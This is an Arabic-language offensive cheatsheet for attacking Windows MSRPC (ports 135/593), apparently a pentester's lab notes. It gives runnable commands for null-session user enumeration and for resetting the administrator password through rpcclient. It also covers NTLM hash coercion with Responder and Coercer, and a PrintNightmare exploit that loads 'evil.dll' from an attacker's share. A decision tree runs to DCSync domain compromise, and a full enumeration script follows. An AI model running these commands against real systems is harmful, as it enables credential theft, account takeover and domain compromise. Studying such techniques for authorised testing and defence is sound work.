



# 🔌 MSRPC Cheatsheet — Port 135 / 593
> **بروتوكول:** Microsoft Remote Procedure Call  
> **البورتات:** 135 (RPC Endpoint Mapper), 593 (RPC over HTTP)

---
```
# تحقق
echo $IP
# إذا طلع فاضي، عرّفه
export IP=10.113.173.71
```
## 📖 كيف يشتغل MSRPC

**Port 135 = Endpoint Mapper** — دوره مثل دليل الهاتف:
```
أنت → Port 135: "وين Print Spooler؟"
DC  → "على port 49680"
أنت → Port 49680: تكلّم الـ Spooler مباشرة
```

كل خدمة عندها **UUID** فريد يميّزها — هذا اللي يطلعه `rpcdump`.

```
Client                          Server
  │  "نفّذ لي هذه الـ function"   │
  │ ─────────────────────────────►│
  │                               │ ينفّذها محلياً
  │◄───────────────────────────── │
  │      "هذه النتيجة"            │
```

---

## 🗺️ Attack Surface — كل بروتوكول وخطره

| البروتوكول | هو إيش | الاستغلال |
|---|---|---|
| MS-RPRN | طلبات الطباعة عن بُعد | PrintNightmare / Coercion → NTLM hash |
| MS-PAR | طباعة async | نفس MS-RPRN |
| MS-EFSRPC | تشفير الملفات عن بُعد | PetitPotam → NTLM hash |
| MS-DRSR | مزامنة AD بين DCs | DCSync → كل الـ hashes |
| MS-NRPC | تسجيل دخول الأجهزة | ZeroLogon → تغيير DC password |
| MS-SCMR | إدارة الـ Services | psexec → SYSTEM shell |
| MS-TSCH | جدولة المهام | atexec → lateral movement |
| MS-SAMR | إدارة المستخدمين | enumeration / password change |
| MS-DNSP | إدارة DNS | ADIDNS poisoning |
| MS-LSAT | ترجمة SIDs | lookupsids / enumeration |

## 🔍 1. الفحص الأولي (Scanning)

### Nmap
```bash
# فحص عام
nmap --script msrpc-enum -p 135 $IP

# فحص RPC over HTTP
nmap -p 593 --script http-rpc-epmap $IP

# كشف ثغرات قديمة ms03-026
nmap $IP --script=msrpc-enum

# Brute force على RPC
nmap --script rpcap-brute,rpcinfo $IP

# SMB brute
nmap --script smb-brute.nse -p 445 $IP
```

### rpcdump — كشف الـ Endpoints
```bash
# بدون مصادقة
impacket-rpcdump -port 135 $IP

# بالـ domain credentials
impacket-rpcdump DOMAIN/user:password@$IP

# بالـ NTLM hash
impacket-rpcdump DOMAIN/user@$IP -hashes LM:NT

# بـ Kerberos
impacket-rpcdump -k DOMAIN/user@$IP

# فلترة الـ vulnerability check فقط
impacket-rpcdump -port 135 $IP | grep -E 'MS-EFSRPC|MS-RPRN|MS-PAR'
```

> **تفسير النتائج:**
> - `MS-EFSRPC` → محتمل PetitPotam
> - `MS-RPRN` / `MS-PAR` → محتمل PrintNightmare

### فلترة الـ Output
```bash
# كل البروتوكولات المسماة فقط (بدون N/A)
impacket-rpcdump -port 135 $IP | grep "^Protocol:" | grep -v "N/A"
impacket-rpcdump -port 135 $IP | grep "^Provider:" | grep -v "N/A"

# كشف attack surface مباشر
impacket-rpcdump -port 135 $IP | grep -E 'MS-RPRN|MS-PAR|MS-EFSRPC|MS-DRSR|MS-NRPC|MS-SCMR|MS-TSCH|MS-DNSP|MS-SAMR|MS-LSAT' | sort -u

# Protocol + Provider معاً (أوضح)
impacket-rpcdump -port 135 $IP | grep -E "^Protocol:|^Provider:" | grep -v "N/A" | paste - -

# awk — ملخص Protocol | Provider
impacket-rpcdump -port 135 $IP | awk '
/^Protocol:.*\[MS-/ { proto=$0 }
/^Provider:/ && proto != "" { print proto" | "$0; proto="" }
'
```

## 🔗 2. rpcclient — الاتصال

```bash
# Null session (anonymous)
rpcclient -U "" -N $IP
rpcclient -N -U '' -p 135 $IP

# بمستخدم معروف
rpcclient -U "username" $IP
rpcclient -U "DOMAIN/username%password" $IP

# Kerberos
rpcclient -k $IP

# تنفيذ أمر واحد مباشرة بدون interactive
rpcclient -U "" -N $IP -c "enumdomusers"
rpcclient -U "DOMAIN\user%password" $IP -c "querydominfo"

# تنفيذ أوامر متعددة بنفس الوقت
rpcclient -U "" -N $IP -c "enumdomusers; enumdomgroups; getdompwinfo"

# عرض المساعدة
rpcclient -h
# أو من داخل الـ shell
rpcclient $> help
```

## 📋 3. Enumeration داخل rpcclient

### معلومات السيرفر والدومين
```
srvinfo              → معلومات السيرفر (platform, version, type)
querydominfo         → معلومات الدومين (policy, users count)
querydispinfo        → تفاصيل المستخدمين مع الـ description
enumdomains          → عرض الدومينات
dsroledominfo        → دور الدومين (DC, Member, Standalone)
dsenumdomtrusts      → trust relationships
lsaquery             → SID الخاص بالدومين
getusername          → المستخدم الحالي
getdompwinfo         → سياسة كلمات المرور (min length, complexity, lockout)
enumtrust            → قائمة الـ domain trusts
enumprivs            → قائمة الـ privileges والـ rights
```

### Users
```
enumdomusers                          → قائمة كل المستخدمين
queryuser <0xRID>                     → تفاصيل مستخدم بالـ RID
queryusergroups <0xRID>               → المجموعات اللي فيها المستخدم
lookupnames <username>                → تحويل اسم → SID
lookupsids <SID>                      → تحويل SID → اسم
queryuseraliases [builtin|domain] <SID>  → الـ aliases
```

### Groups
```
enumdomgroups                         → قائمة مجموعات الدومين
querygroup <0xRID>                    → تفاصيل مجموعة
querygroupmem <0xRID>                 → أعضاء مجموعة
querygroupmem 0x200                   → Domain Admins (RID 512)
querygroupmem 0x201                   → Domain Users  (RID 513)

enumalsgroups builtin                 → Built-in aliases
enumalsgroups domain                  → Domain aliases
queryaliasmem builtin <0xRID>         → أعضاء alias
```

### SID & RID
```
lsaquery             → SID الدومين
lsaenumsid           → قائمة كل الـ SIDs
lookupsids <SID>     → تحويل SID → اسم
lookupnames <user>   → تحويل اسم → SID
```

### Shares
```
netshareenumall                       → قائمة كل الـ network shares
```

### Printers
```
enumprinters         → قائمة الطابعات (مفيد لكشف PrintNightmare)
```

### RID Cycling
```
lookupsids S-1-5-21-<domain>-<RID>    → enumerate users عبر RID cycling
```

### إدارة المستخدمين (تحتاج صلاحيات)
```
createdomuser <username>                    → إنشاء مستخدم جديد
deletedomuser <username>                    → حذف مستخدم
lsaaddacctrights <SID> <right>             → إضافة صلاحية
lsaremoveacctrights <SID> <right>          → إزالة صلاحية
```

## 🔑 4. تغيير كلمة المرور

```bash
# من داخل rpcclient
setuserinfo2 <username> 23 '<new_password>'

# مباشرة من shell
rpcclient -N $IP -U 'DOMAIN/user%password' \
  -c "setuserinfo2 targetuser 23 'NewPass123!'"

rpcclient -U "" -N $IP \
  -c "setuserinfo2 administrator 23 'NewPass123!'"
```

| Level | البيانات |
|-------|---------|
| 0 | username, fullname |
| 1 | home dir, script path |
| 2 | password age, privileges |
| 3 | + group membership |
| 4 | + SID |
| **23** | **تغيير كلمة المرور ← الأهم** |

### 🖨️ MS-RPRN / MS-PAR — Coercion & PrintNightmare

**متى؟**

- لما تشوف `MS-RPRN` أو `MS-PAR` في الـ rpcdump
- وعندك **user عادي** أو حتى **بدون credentials**

**السيناريو الأول — Coercion (بدون أو بـ credentials):**

bash

```bash
# 1. شغّل Responder يستنى
sudo responder -I tun0 -A

# 2. في terminal ثاني، أرسل الـ coerce
python3 Coercer.py coerce -l 192.168.201.92 -t 10.113.173.71 --always-continue
```

الناتج في Responder:

> الـ DC راح يتصل فيك تلقائياً ويرسل الـ hash — تكسره بـ hashcat أو تعمله relay

**السيناريو الثاني — PrintNightmare (عندك user عادي):**

bash

```bash
python3 CVE-2021-1675.py CROCC/jsmith:Password1@10.113.173.71 '\\10.10.14.5\share\evil.dll'
```

### 🌐 MS-DNSP — DNS Attacks

**متى؟**

- عندك **user عادي** في الدومين
- تبي تضيف A record لـ hostname وهمي يشير عليك
- أي جهاز يحاول يتصل بالـ hostname يرسلك الـ NTLM hash

```bash
# شغّل Responder يستنى
sudo responder -I tun0 -A
```

### الترتيب المنطقي في الـ engagement
```
بدون credentials
  └─► Coercion (RPRN/EFSRPC) → hash → crack أو relay

User عادي
  └─► PrintNightmare → SYSTEM
  └─► DNS poisoning → hash آخر

Admin محلي
  └─► secretsdump → hashes
  └─► PTH على باقي الأجهزة

Domain Admin
  └─► DCSync → كل هاش في الدومين → Game Over
```

## 🧭 17. Quick Decision Tree

```
Port 135 مفتوح؟
│
├── rpcdump → فلتر البروتوكولات
│   ├── MS-EFSRPC  → PetitPotam Coercion
│   ├── MS-RPRN    → PrintNightmare / Coercion
│   ├── MS-PAR     → نفس MS-RPRN
│   ├── MS-DRSR    → DCSync (تحتاج صلاحيات)
│   ├── MS-NRPC    → ZeroLogon check
│   ├── MS-SCMR    → psexec/smbexec
│   └── MS-TSCH    → atexec
│
├── بدون credentials؟
│   ├── Coercion (MS-RPRN/EFSRPC) → Responder → Hash → Crack/Relay
│   └── rpcclient Null session → enumdomusers
│
├── User عادي؟
│   ├── MS-SAMR → enumdomusers → Kerberoasting / AS-REP Roasting
│   ├── MS-TSCH → lateral movement
│   └── MS-RPRN موجود → PrintNightmare → SYSTEM
│
└── Domain Admin؟
    └── MS-DRSR → DCSync → كل الـ hashes
```

```
#!/bin/bash
# ============================================================
# rpc_enum.sh — Full rpcclient Enumeration Script
# Usage: ./rpc_enum.sh <IP> [username] [password]
# ============================================================

IP="${1}"
USER="${2:-}"
PASS="${3:-}"
OUT="rpc_enum_${IP}.txt"

if [[ -z "$IP" ]]; then
    echo "Usage: $0 <IP> [username] [password]"
    exit 1
fi

# بناء الـ auth string
if [[ -z "$USER" ]]; then
    AUTH='-U "" -N'
    echo "[*] Mode: Null Session (Anonymous)"
else
    AUTH="-U \"${USER}%${PASS}\""
    echo "[*] Mode: Authenticated ($USER)"
fi

RPC="rpcclient $AUTH $IP"

run() {
    local title="$1"
    local cmd="$2"
    echo ""
    echo "========================================"
    echo "[+] $title"
    echo "========================================"
    eval "$RPC -c \"$cmd\"" 2>&1
}

echo "========================================"  | tee $OUT
echo " rpc_enum.sh — Target: $IP"               | tee -a $OUT
echo " $(date)"                                  | tee -a $OUT
echo "========================================"  | tee -a $OUT

{
# ── SERVER & DOMAIN INFO ──────────────────────────────────
run "Server Info"              "srvinfo"
run "Domain Info"              "querydominfo"
run "Display Info (Users)"     "querydispinfo"
run "Domain Role"              "dsroledominfo"
run "Domain SID (lsaquery)"   "lsaquery"
run "Current User"             "getusername"
run "Password Policy"          "getdompwinfo"
run "Domain Trusts"            "enumtrust"
run "Domain Trusts (DS)"       "dsenumdomtrusts"
run "Privileges"               "enumprivs"
run "List Domains"             "enumdomains"

# ── USERS ─────────────────────────────────────────────────
run "Domain Users"             "enumdomusers"
run "All SIDs (lsaenumsid)"   "lsaenumsid"

# ── GROUPS ───────────────────────────────────────────────
run "Domain Groups"            "enumdomgroups"
run "Domain Admins Members"    "querygroupmem 0x200"
run "Domain Users Members"     "querygroupmem 0x201"
run "Built-in Aliases"         "enumalsgroups builtin"
run "Domain Aliases"           "enumalsgroups domain"
run "Administrators (0x220)"   "queryaliasmem builtin 0x220"
run "Remote Desktop Users"     "queryaliasmem builtin 0x22b"
run "Backup Operators"         "queryaliasmem builtin 0x227"

# ── SHARES ───────────────────────────────────────────────
run "All Shares"               "netshareenumall"

# ── PRINTERS ─────────────────────────────────────────────
run "Printers (PrintNightmare check)" "enumprinters"

} 2>&1 | tee -a $OUT

echo ""
echo "========================================"
echo "[*] Done. Output saved: $OUT"
echo "========================================"

# ── POST: استخرج الـ RIDs وشغّل queryuser على كل واحد ──
echo ""
echo "[*] Extracting RIDs for queryuser..."
RIDS=$(rpcclient $AUTH $IP -c "enumdomusers" 2>/dev/null | grep -oP 'rid:\[0x[0-9a-fA-F]+\]' | grep -oP '0x[0-9a-fA-F]+')

if [[ -n "$RIDS" ]]; then
    echo ""
    echo "========================================"  | tee -a $OUT
    echo "[+] User Details (queryuser per RID)"     | tee -a $OUT
    echo "========================================"  | tee -a $OUT
    for rid in $RIDS; do
        echo ""                                      | tee -a $OUT
        echo "--- queryuser $rid ---"               | tee -a $OUT
        eval "$RPC -c \"queryuser $rid\"" 2>&1      | tee -a $OUT
    done
else
    echo "[-] No RIDs found (null session might be restricted)"
fi

echo ""
echo "[*] Full output: $OUT"
```
